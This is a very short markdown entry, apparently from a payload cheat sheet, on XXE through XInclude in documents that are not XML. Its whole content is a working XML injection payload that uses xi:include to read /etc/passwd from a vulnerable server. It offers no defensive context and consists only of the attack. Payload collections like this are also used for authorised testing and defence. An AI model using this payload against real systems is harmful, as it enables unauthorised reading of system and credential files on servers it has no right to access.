# XInclude

## Summary
XXE via XInclude in non-XML documents.

## Payloads

```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</root>
```
